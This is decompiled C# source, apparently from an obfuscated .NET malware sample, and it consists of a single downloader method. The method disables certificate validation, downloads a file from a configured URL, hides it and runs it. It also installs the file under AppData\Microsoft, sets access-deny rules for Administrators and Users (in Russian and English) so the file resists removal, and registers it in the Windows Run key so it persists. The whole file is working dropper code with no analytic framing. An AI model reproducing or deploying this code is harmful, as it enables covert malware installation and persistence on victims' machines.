using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Threading;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using ns20;

namespace ns13;

public class GClass13
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = C.A;
			WebClient webClient = new WebClient();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = Path.GetTempFileName() + Path.GetFileName(GClass20.string_29);
			object objectValue = RuntimeHelpers.GetObjectValue(C.g("WgmyPMz2uu5LAZJLhPcNqjFxIzL2B6FlxhV2GHeubSk="));
			object objectValue2 = RuntimeHelpers.GetObjectValue(C.g("TscoVLHw0PtQwAgRRrOcnw=="));
			string text2 = Conversions.ToString(6);
			if (Operators.CompareString(GClass20.string_29, "", false) != 0)
			{
				if (GClass20.bool_18)
				{
					if (Operators.CompareString(C.b("Downloader"), "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==", false) != 0)
					{
						webClient.DownloadFile(GClass20.string_29, text);
						File.SetAttributes(text, FileAttributes.Hidden);
						Process.Start(text);
						C.a("Downloader", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
					}
				}
				else
				{
					webClient.DownloadFile(GClass20.string_29, text);
					Directory.CreateDirectory(folderPath + "\\Microsoft\\" + C.b(6));
					File.Move(text, Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\"), Operators.AddObject((object)(C.b(6) + "\\"), objectValue))));
					FileSystem.SetAttr(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\"), Operators.AddObject((object)(C.b(6) + "\\"), objectValue))), (FileAttribute)Conversions.ToInteger(text2));
					FileSystem.SetAttr(folderPath + "\\Microsoft\\" + C.b(6), (FileAttribute)Conversions.ToInteger(text2));
					C.A(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + C.b(6) + "\\"), objectValue)), "BUILTIN\\Администраторы", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + C.b(6) + "\\"), objectValue)), "BUILTIN\\Пользователи", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + C.b(6) + "\\"), objectValue)), "BUILTIN\\Administrators", FileSystemRights.FullControl, AccessControlType.Deny);
					C.A(Conversions.ToString(Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + C.b(6) + "\\"), objectValue)), "BUILTIN\\Users", FileSystemRights.FullControl, AccessControlType.Deny);
					Thread.Sleep(100);
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Conversions.ToString(objectValue2), Operators.ConcatenateObject((object)(folderPath + "\\Microsoft\\" + C.b(6) + "\\"), objectValue));
				}
			}
			try
			{
				webClient.Dispose();
				webClient = null;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
